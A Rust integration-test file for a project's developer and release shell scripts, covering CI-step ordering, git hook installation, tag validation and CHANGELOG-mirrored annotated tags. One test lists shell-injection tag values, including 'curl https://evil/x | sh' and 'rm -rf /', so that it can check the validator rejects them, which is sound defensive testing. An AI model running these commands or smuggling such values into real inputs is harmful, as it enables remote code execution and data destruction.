//! Integration tests for the developer helper scripts:
//!   * `scripts/check.sh`        — local equivalent of CI (fmt + clippy + test).
//!   * `scripts/install-hooks.sh` — installs a git `pre-commit` hook that
//!     delegates to `scripts/check.sh`.
//!   * `scripts/release-validate-tag.sh` — the tag-shape validator shared by
//!     both call sites in the release workflow.
//!   * `scripts/release-prep.sh` — prints the canonical annotated-tag message
//!     for a version (subject + CHANGELOG section body).
//!   * `scripts/release-verify-tag-body.sh` — checks a created tag is
//!     annotated and its body mirrors the CHANGELOG section (ADR-0011).
//!
//! Both scripts are POSIX bash. Tests drive them through `bash` with a
//! tempdir-isolated environment so the project's real `.git/hooks/` and
//! `cargo` are never touched.
//!
//! Unix-only: same reasoning as `release_check_changelog.rs` —
//! `Command::new("bash")` on Windows CI is unreliable, and these scripts
//! are documented as Linux/macOS developer tooling.

#![cfg(unix)]

use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::{Path, PathBuf};
use std::process::Command;
use tempfile::tempdir;

fn project_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
}

fn script(name: &str) -> PathBuf {
    project_root().join("scripts").join(name)
}

/// Put a fake `cargo` and a fake `yamllint` in `bin_dir`, both of them
/// symlinks to `tests/fixtures/fake-tool.sh`. The fake decides which tool it
/// plays from the name it was invoked by, and logs and exits according to the
/// environment `run_check_once` passes it.
///
/// The fakes are linked rather than written because a file that is being
/// written cannot be executed while another thread's fork still holds the
/// descriptor: the run then dies with exit code 126 and an empty log, which
/// reads as if check.sh had skipped its steps. That is what made
/// `check_fails_fast_when_fmt_fails` fail the release run of 0.13.0, and
/// writing the fakes per test reproduced it locally within a few runs.
fn link_fake_tools(bin_dir: &Path) {
    let fake = project_root()
        .join("tests")
        .join("fixtures")
        .join("fake-tool.sh");

    for name in ["cargo", "yamllint"] {
        symlink(&fake, bin_dir.join(name)).unwrap();
    }
}

/// Run the fake `cargo` once and check that it both executed and logged. A
/// tempdir mounted `noexec`, or a fixture that lost its executable bit,
/// otherwise shows up much later as a run that made no invocations at all --
/// which reads as if the script had skipped its steps.
fn probe_fake_cargo(bin_dir: &Path, log: &Path) {
    let probe = Command::new(bin_dir.join("cargo"))
        .arg("--probe")
        .env("FAKE_LOG", log)
        .output()
        .expect("execute the fake cargo");
    assert!(
        probe.status.success(),
        "the fake cargo in {} did not run: exit {:?}, stderr: {}",
        bin_dir.display(),
        probe.status.code(),
        String::from_utf8_lossy(&probe.stderr)
    );
    let logged = fs::read_to_string(log).unwrap_or_default();
    assert_eq!(
        logged.lines().filter(|l| !l.trim().is_empty()).count(),
        1,
        "the fake cargo ran but logged nothing to {}",
        log.display()
    );
    fs::write(log, "").expect("clear the probe entry from the log");
}

/// What one run of `scripts/check.sh` produced.
struct Check {
    code: i32,
    stdout: String,
    stderr: String,
    /// One line per fake-tool invocation, in the order the script made them.
    invocations: Vec<String>,
}

impl Check {
    /// Everything the run produced, for a failing assertion to quote. A run
    /// that never reached the fake tools otherwise reads as an empty list of
    /// invocations and says nothing about why it stopped.
    fn report(&self) -> String {
        format!(
            "exit code {}; invocations {:?}; stdout:\n{}\nstderr:\n{}",
            self.code, self.invocations, self.stdout, self.stderr
        )
    }
}

/// Run `scripts/check.sh` with PATH pinned to a tempdir holding the fake
/// `cargo` and `yamllint`, followed by the real PATH. `fail_on` triggers
/// exit-1 in the matching step: cargo subcommands (`fmt`, `clippy`, `doc`,
/// `test`) and the literal `yamllint`.
fn run_check(fail_on: Option<&str>) -> Check {
    let dir = tempdir().unwrap();
    let bin_dir = dir.path().join("bin");
    fs::create_dir(&bin_dir).unwrap();
    let log = dir.path().join("invocations.log");
    let cargo_fail = match fail_on {
        Some(s) if matches!(s, "fmt" | "clippy" | "doc" | "test") => s,
        _ => "__none__",
    };
    let yamllint_exit = i32::from(matches!(fail_on, Some("yamllint")));
    link_fake_tools(&bin_dir);
    probe_fake_cargo(&bin_dir, &log);

    let path = std::env::var("PATH").unwrap_or_default();
    let new_path = format!("{}:{}", bin_dir.display(), path);

    let output = Command::new("bash")
        .arg(script("check.sh"))
        .env("PATH", new_path)
        .env("FAKE_LOG", &log)
        .env("FAKE_CARGO_FAIL", cargo_fail)
        .env("FAKE_YAMLLINT_EXIT", yamllint_exit.to_string())
        .output()
        .expect("invoke check.sh");

    let log_contents = fs::read_to_string(&log).unwrap_or_default();

    Check {
        code: output.status.code().unwrap_or(-1),
        stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
        invocations: log_contents
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect(),
    }
}

#[test]
fn check_runs_fmt_yamllint_clippy_doc_test_in_order_on_success() {
    let run = run_check(None);
    let invocations = &run.invocations;
    assert_eq!(run.code, 0, "expected success; {}", run.report());
    assert_eq!(
        invocations.len(),
        5,
        "expected exactly 5 invocations (fmt, yamllint, clippy, doc, test); {}",
        run.report()
    );
    // fmt --check, yamllint .github/workflows/, clippy -D warnings,
    // doc -D warnings, then test.
    assert!(
        invocations[0].starts_with("fmt"),
        "first invocation should be cargo fmt: {:?}",
        invocations[0]
    );
    assert!(
        invocations[0].contains("--check"),
        "fmt must run in --check mode: {:?}",
        invocations[0]
    );
    assert!(
        invocations[1].starts_with("yamllint"),
        "second invocation should be yamllint: {:?}",
        invocations[1]
    );
    assert!(
        invocations[1].contains(".github/workflows"),
        "yamllint must target the workflow directory: {:?}",
        invocations[1]
    );
    assert!(
        invocations[2].starts_with("clippy"),
        "third invocation should be cargo clippy: {:?}",
        invocations[2]
    );
    assert!(
        invocations[2].contains("-D warnings"),
        "clippy must deny warnings: {:?}",
        invocations[2]
    );
    assert!(
        invocations[3].starts_with("doc"),
        "fourth invocation should be cargo doc: {:?}",
        invocations[3]
    );
    assert!(
        invocations[3].contains("--no-deps"),
        "doc must skip deps to keep the step fast: {:?}",
        invocations[3]
    );
    assert!(
        invocations[4].starts_with("test"),
        "fifth invocation should be cargo test: {:?}",
        invocations[4]
    );
}

#[test]
fn check_fails_fast_when_fmt_fails() {
    let run = run_check(Some("fmt"));
    let invocations = &run.invocations;
    assert_ne!(run.code, 0, "expected failure when fmt fails");
    assert_eq!(
        invocations.len(),
        1,
        "fail-fast: yamllint/clippy/doc/test must not run after fmt failure; {}",
        run.report()
    );
    assert!(
        invocations[0].starts_with("fmt"),
        "the single failed invocation must be fmt: {:?}",
        invocations[0]
    );
    assert!(
        run.stderr.contains("fmt") || run.stderr.contains("format"),
        "stderr should mention which step failed: {}",
        run.stderr
    );
}

#[test]
fn check_fails_fast_when_yamllint_fails() {
    let run = run_check(Some("yamllint"));
    let invocations = &run.invocations;
    assert_ne!(run.code, 0, "expected failure when yamllint fails");
    assert_eq!(
        invocations.len(),
        2,
        "fail-fast: clippy/doc/test must not run after yamllint failure; {}",
        run.report()
    );
    assert!(invocations[0].starts_with("fmt"));
    assert!(
        invocations[1].starts_with("yamllint"),
        "the failed invocation must be yamllint: {:?}",
        invocations[1]
    );
    assert!(
        run.stderr.contains("yamllint"),
        "stderr should mention which step failed: {}",
        run.stderr
    );
}

#[test]
fn check_fails_fast_when_clippy_fails() {
    let run = run_check(Some("clippy"));
    let invocations = &run.invocations;
    assert_ne!(run.code, 0, "expected failure when clippy fails");
    assert_eq!(
        invocations.len(),
        3,
        "fail-fast: doc/test must not run after clippy failure; {}",
        run.report()
    );
    assert!(invocations[2].starts_with("clippy"));
}

#[test]
fn check_fails_fast_when_doc_fails() {
    let run = run_check(Some("doc"));
    let invocations = &run.invocations;
    assert_ne!(run.code, 0, "expected failure when doc fails");
    assert_eq!(
        invocations.len(),
        4,
        "fail-fast: test must not run after doc failure; {}",
        run.report()
    );
    assert!(invocations[3].starts_with("doc"));
}

#[test]
fn check_fails_when_test_fails() {
    let run = run_check(Some("test"));
    let invocations = &run.invocations;
    assert_ne!(run.code, 0, "expected failure when test fails");
    assert_eq!(
        invocations.len(),
        5,
        "all five steps should run; {}",
        run.report()
    );
    assert!(invocations[4].starts_with("test"));
}

/// Initialise a minimal git repo in `dir`. We don't need any commits — only
/// `.git/hooks/` and `git rev-parse --show-toplevel` must work.
fn init_git_repo(dir: &Path) {
    let status = Command::new("git")
        .arg("-c")
        .arg("init.defaultBranch=main")
        .arg("init")
        .arg("--quiet")
        .current_dir(dir)
        .status()
        .expect("run git init");
    assert!(status.success(), "git init failed in {}", dir.display());
}

fn run_install_hooks(repo: &Path, args: &[&str]) -> (i32, String, String) {
    let output = Command::new("bash")
        .arg(script("install-hooks.sh"))
        .args(args)
        .current_dir(repo)
        .output()
        .expect("invoke install-hooks.sh");
    (
        output.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&output.stdout).into_owned(),
        String::from_utf8_lossy(&output.stderr).into_owned(),
    )
}

#[test]
fn install_hooks_creates_pre_commit_hook() {
    let dir = tempdir().unwrap();
    init_git_repo(dir.path());

    let (code, _stdout, stderr) = run_install_hooks(dir.path(), &[]);
    assert_eq!(code, 0, "install-hooks must succeed; stderr: {stderr}");

    let hook = dir.path().join(".git").join("hooks").join("pre-commit");
    assert!(
        hook.is_file(),
        "pre-commit hook was not created at {}",
        hook.display()
    );
    let mode = fs::metadata(&hook).unwrap().permissions().mode();
    assert!(
        mode & 0o111 != 0,
        "pre-commit hook must be executable, got mode {mode:o}"
    );
    let body = fs::read_to_string(&hook).unwrap();
    assert!(
        body.contains("scripts/check.sh"),
        "hook must delegate to scripts/check.sh; body: {body}"
    );
}

#[test]
fn install_hooks_refuses_to_overwrite_existing_hook() {
    let dir = tempdir().unwrap();
    init_git_repo(dir.path());
    let hooks_dir = dir.path().join(".git").join("hooks");
    let hook = hooks_dir.join("pre-commit");
    fs::write(&hook, "#!/bin/sh\necho 'user hook'\n").unwrap();
    let mut perms = fs::metadata(&hook).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(&hook, perms).unwrap();

    let (code, _stdout, stderr) = run_install_hooks(dir.path(), &[]);
    assert_ne!(code, 0, "must refuse to overwrite an existing hook");
    assert!(
        stderr.contains("--force") || stderr.contains("exists"),
        "stderr must explain how to overwrite: {stderr}"
    );

    let body = fs::read_to_string(&hook).unwrap();
    assert!(
        body.contains("user hook"),
        "existing hook must remain intact when overwrite is refused; body: {body}"
    );
}

#[test]
fn install_hooks_overwrites_with_force_flag() {
    let dir = tempdir().unwrap();
    init_git_repo(dir.path());
    let hooks_dir = dir.path().join(".git").join("hooks");
    let hook = hooks_dir.join("pre-commit");
    fs::write(&hook, "#!/bin/sh\necho 'old hook'\n").unwrap();
    let mut perms = fs::metadata(&hook).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(&hook, perms).unwrap();

    let (code, _stdout, stderr) = run_install_hooks(dir.path(), &["--force"]);
    assert_eq!(code, 0, "--force must overwrite; stderr: {stderr}");

    let body = fs::read_to_string(&hook).unwrap();
    assert!(
        body.contains("scripts/check.sh"),
        "after --force, hook must delegate to scripts/check.sh; body: {body}"
    );
    assert!(
        !body.contains("old hook"),
        "old hook content must be replaced; body: {body}"
    );
}

// `scripts/release-validate-tag.sh` is invoked from `.github/workflows/release.yml`
// after the tag is materialised from `inputs.tag` (workflow_dispatch) or from
// the pushed `refs/tags/...` ref. The script is the single-source-of-truth for
// what counts as a project tag; both call sites delegate to it so an injection
// vector via `inputs.tag` cannot bypass validation.

fn run_release_validate_tag(tag: &str) -> (i32, String, String) {
    let output = Command::new("bash")
        .arg(script("release-validate-tag.sh"))
        .arg(tag)
        .output()
        .expect("invoke release-validate-tag.sh");
    let code = output.status.code().unwrap_or(-1);
    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
    (code, stdout, stderr)
}

#[test]
fn release_validate_tag_accepts_canonical_semver() {
    let (code, _out, err) = run_release_validate_tag("v0.5.0");
    assert_eq!(code, 0, "must accept v0.5.0; stderr: {err}");
    let (code, _out, err) = run_release_validate_tag("v10.20.30");
    assert_eq!(code, 0, "must accept v10.20.30; stderr: {err}");
}

#[test]
fn release_validate_tag_accepts_pre_release_suffix() {
    let (code, _out, err) = run_release_validate_tag("v0.5.0-rc.1");
    assert_eq!(code, 0, "must accept pre-release suffix; stderr: {err}");
    let (code, _out, err) = run_release_validate_tag("v1.0.0-beta");
    assert_eq!(
        code, 0,
        "must accept short pre-release suffix; stderr: {err}"
    );
}

#[test]
fn release_validate_tag_rejects_empty_input() {
    let (code, _out, err) = run_release_validate_tag("");
    assert_ne!(code, 0, "must reject empty tag");
    assert!(
        err.contains("empty") || err.contains("does not match"),
        "stderr must explain rejection: {err}"
    );
}

#[test]
fn release_validate_tag_rejects_shell_metacharacters() {
    // The script-injection vector from the 2026-05-25 SEC-1 finding: a
    // workflow_dispatch caller supplies a tag like `v0.1.0"; curl evil | sh; #`.
    // Even though the workflow now passes the value via `env:` (so YAML
    // expansion cannot smuggle the payload into the shell), defense in depth
    // requires the validator to refuse the malformed form too.
    let injections = [
        "v0.1.0\"; curl https://evil/x | sh; #",
        "v0.1.0; rm -rf /",
        "v0.1.0$(echo pwned)",
        "v0.1.0`echo pwned`",
        "v0.1.0 && echo pwned",
        "v0.1.0\nrm -rf /",
    ];
    for bad in injections {
        let (code, _out, err) = run_release_validate_tag(bad);
        assert_ne!(
            code, 0,
            "must reject injection payload `{bad}`; stderr: {err}"
        );
    }
}

#[test]
fn release_validate_tag_rejects_missing_v_prefix() {
    let (code, _out, err) = run_release_validate_tag("0.5.0");
    assert_ne!(code, 0, "must require leading `v`; stderr: {err}");
}

#[test]
fn release_validate_tag_rejects_short_or_partial_versions() {
    for bad in ["v1", "v1.0", "v.1.2.3", "v1.2.3.4", "vfoo"] {
        let (code, _out, err) = run_release_validate_tag(bad);
        assert_ne!(code, 0, "must reject `{bad}`; stderr: {err}");
    }
}

#[test]
fn install_hooks_fails_outside_git_repo() {
    let dir = tempdir().unwrap();
    // No `git init` — the script must refuse to guess.

    let (code, _stdout, stderr) = run_install_hooks(dir.path(), &[]);
    assert_ne!(code, 0, "must fail outside a git work tree");
    assert!(
        stderr.contains("git") || stderr.contains("repository"),
        "stderr should explain the missing repo: {stderr}"
    );
}

#[test]
fn audit_sh_skips_gracefully_when_cargo_audit_missing() {
    // MIN-9 (2026-05-25 review): scripts/audit.sh is the deliberate
    // out-of-pre-commit place for the RustSec advisory scan. When the
    // optional `cargo-audit` binary is not installed it must print how to
    // install it and exit 0 — a missing optional tool is not a failure of
    // the caller's change.
    //
    // PATH is restricted to /usr/bin:/bin so `command -v cargo-audit` fails
    // deterministically (cargo install puts cargo-audit in ~/.cargo/bin,
    // which is excluded), while the shebang's `/usr/bin/env bash` and bash
    // itself remain resolvable.
    let out = Command::new(script("audit.sh"))
        .env("PATH", "/usr/bin:/bin")
        .output()
        .expect("run audit.sh");
    assert!(
        out.status.success(),
        "a missing cargo-audit must be a graceful skip (exit 0); status: {:?}",
        out.status
    );
    let stderr = String::from_utf8_lossy(&out.stderr);
    assert!(
        stderr.contains("cargo-audit is not installed"),
        "stderr should explain the tool is absent: {stderr}"
    );
    assert!(
        stderr.contains("cargo install --locked cargo-audit"),
        "stderr should give the install command: {stderr}"
    );
}

// `scripts/release-prep.sh` and `scripts/release-verify-tag-body.sh` close
// the L1/I1/I2 gap from the 2026-05-25 release review: the v0.5.0 annotated
// tag lost its `### Added` / `### Changed` headings because the default tag
// message cleanup (`strip`) deletes lines beginning with the comment
// character `#`. release-prep.sh emits the canonical message; the verify
// script (run in the release workflow before publishing) refuses a tag whose
// body drifted from CHANGELOG.

/// A minimal CHANGELOG fixture with the em-dash header shape that
/// `scripts/check-changelog.sh` and the awk extractor require. The 0.4.0
/// section carries two `### ` subheadings so a `strip`-cleanup regression is
/// observable.
const CHANGELOG_FIXTURE: &str = "\
# Changelog

## [Unreleased]

_No user-visible changes yet._

## [0.4.0] — 2026-06-10

### Added

- `--watch` mode that re-runs the agenda on file change.

### Fixed

- Holiday calendar lookup for 2027 (off-by-one on New Year).

## [0.3.0] — 2026-05-01

### Added

- earlier release content that must not leak into 0.4.0 notes.
";

/// The exact message `release-prep.sh 0.4.0` must print for CHANGELOG_FIXTURE:
/// the `v0.4.0` subject, a blank line, then the section body with both
/// `### ` headings preserved and surrounding blank lines trimmed.
const EXPECTED_PREP_0_4_0: &str = "\
v0.4.0

### Added

- `--watch` mode that re-runs the agenda on file change.

### Fixed

- Holiday calendar lookup for 2027 (off-by-one on New Year).";

/// Run `scripts/release-prep.sh <version>` with `CHANGELOG` pointed at a
/// fixture file written into a fresh tempdir. Returns (exit code, stdout,
/// stderr).
fn run_release_prep(version: &str, changelog: &str) -> (i32, String, String) {
    let dir = tempdir().unwrap();
    let changelog_path = dir.path().join("CHANGELOG.md");
    fs::write(&changelog_path, changelog).unwrap();

    let output = Command::new("bash")
        .arg(script("release-prep.sh"))
        .arg(version)
        .env("CHANGELOG", &changelog_path)
        .output()
        .expect("invoke release-prep.sh");
    (
        output.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&output.stdout).into_owned(),
        String::from_utf8_lossy(&output.stderr).into_owned(),
    )
}

#[test]
fn release_prep_emits_subject_and_section_body_with_headings() {
    let (code, stdout, stderr) = run_release_prep("0.4.0", CHANGELOG_FIXTURE);
    assert_eq!(code, 0, "release-prep.sh must succeed; stderr: {stderr}");
    // Trailing newline aside, the body must match byte-for-byte, including the
    // `### Added` / `### Fixed` headings the v0.5.0 tag lost.
    assert_eq!(
        stdout.trim_end_matches('\n'),
        EXPECTED_PREP_0_4_0,
        "release-prep.sh body must mirror the CHANGELOG section verbatim"
    );
}

#[test]
fn release_prep_fails_when_section_missing() {
    let (code, stdout, stderr) = run_release_prep("9.9.9", CHANGELOG_FIXTURE);
    assert_ne!(code, 0, "missing section must be an error");
    assert!(stdout.is_empty(), "no stdout on error; got: {stdout:?}");
    assert!(
        stderr.contains("9.9.9"),
        "stderr should name the missing version: {stderr}"
    );
}

/// Initialise a git repo in `dir` with a committer identity and the CHANGELOG
/// fixture committed, so `git tag -a` works.
fn init_repo_with_changelog(dir: &Path) {
    init_git_repo(dir);
    for (k, v) in [("user.email", "t@example.invalid"), ("user.name", "Test")] {
        let ok = Command::new("git")
            .args(["config", k, v])
            .current_dir(dir)
            .status()
            .expect("git config")
            .success();
        assert!(ok, "git config {k} failed");
    }
    fs::write(dir.join("CHANGELOG.md"), CHANGELOG_FIXTURE).unwrap();
    let ok = Command::new("git")
        .args(["add", "CHANGELOG.md"])
        .current_dir(dir)
        .status()
        .expect("git add")
        .success();
    assert!(ok, "git add failed");
    let ok = Command::new("git")
        .args(["commit", "-q", "-m", "release: 0.4.0"])
        .current_dir(dir)
        .status()
        .expect("git commit")
        .success();
    assert!(ok, "git commit failed");
}

/// Create an annotated tag whose message is `release-prep.sh <version>`.
/// `verbatim` selects `--cleanup=verbatim` (headings survive) vs the default
/// `strip` cleanup (headings dropped).
fn tag_from_prep(repo: &Path, version: &str, verbatim: bool) {
    let body = Command::new("bash")
        .arg(script("release-prep.sh"))
        .arg(version)
        .current_dir(repo)
        .output()
        .expect("release-prep.sh for tagging");
    assert!(
        body.status.success(),
        "release-prep.sh failed: {}",
        String::from_utf8_lossy(&body.stderr)
    );
    let body_file = repo.join("tagbody.txt");
    fs::write(&body_file, &body.stdout).unwrap();

    let tag = format!("v{version}");
    let body_file_str = body_file.to_str().unwrap();
    let mut args: Vec<&str> = vec!["tag", "-a", &tag];
    if verbatim {
        args.push("--cleanup=verbatim");
    }
    args.push("-F");
    args.push(body_file_str);

    let ok = Command::new("git")
        .args(&args)
        .current_dir(repo)
        .status()
        .expect("git tag -a")
        .success();
    assert!(ok, "git tag -a failed");
    fs::remove_file(&body_file).ok();
}

fn run_release_verify(repo: &Path, version: &str) -> (i32, String, String) {
    let output = Command::new("bash")
        .arg(script("release-verify-tag-body.sh"))
        .arg(version)
        .current_dir(repo)
        .output()
        .expect("invoke release-verify-tag-body.sh");
    (
        output.status.code().unwrap_or(-1),
        String::from_utf8_lossy(&output.stdout).into_owned(),
        String::from_utf8_lossy(&output.stderr).into_owned(),
    )
}

#[test]
fn release_verify_accepts_verbatim_tag_mirroring_changelog() {
    let dir = tempdir().unwrap();
    init_repo_with_changelog(dir.path());
    tag_from_prep(dir.path(), "0.4.0", /* verbatim */ true);

    let (code, _out, stderr) = run_release_verify(dir.path(), "0.4.0");
    assert_eq!(
        code, 0,
        "a verbatim tag built from release-prep.sh must verify; stderr: {stderr}"
    );
}

#[test]
fn release_verify_rejects_lightweight_tag() {
    let dir = tempdir().unwrap();
    init_repo_with_changelog(dir.path());
    let ok = Command::new("git")
        .args(["tag", "v0.4.0"]) // lightweight: no -a
        .current_dir(dir.path())
        .status()
        .expect("git tag (lightweight)")
        .success();
    assert!(ok, "lightweight git tag failed");

    let (code, _out, stderr) = run_release_verify(dir.path(), "0.4.0");
    assert_ne!(code, 0, "a lightweight tag must be rejected");
    assert!(
        stderr.contains("annotated"),
        "stderr must explain the tag is not annotated: {stderr}"
    );
}

#[test]
fn release_verify_rejects_strip_cleanup_that_drops_headings() {
    // The literal v0.5.0 regression: tagging with the default cleanup (strip)
    // removes every `### ...` line because it begins with the comment
    // character. The verify step must catch this and point at --cleanup=verbatim.
    let dir = tempdir().unwrap();
    init_repo_with_changelog(dir.path());
    tag_from_prep(dir.path(), "0.4.0", /* verbatim */ false);

    let (code, _out, stderr) = run_release_verify(dir.path(), "0.4.0");
    assert_ne!(
        code, 0,
        "a strip-cleanup tag that dropped ### headings must be rejected"
    );
    assert!(
        stderr.contains("verbatim"),
        "stderr must recommend --cleanup=verbatim: {stderr}"
    );
    assert!(
        stderr.contains("### Added") || stderr.contains("does not mirror"),
        "stderr should show the divergence: {stderr}"
    );
}
